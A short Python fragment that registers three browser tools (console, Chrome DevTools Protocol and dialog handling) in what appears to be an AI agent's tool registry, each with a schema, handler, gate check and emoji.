registry.register("browser_console", "browser", CONSOLE_SCHEMA, browser_console,
                  check_fn=_GATE, emoji="📜")
registry.register("browser_cdp", "browser", CDP_SCHEMA, browser_cdp,
                  check_fn=_GATE, emoji="🧪")
registry.register("browser_dialog", "browser", DIALOG_SCHEMA, browser_dialog,
                  check_fn=_GATE, emoji="💬")
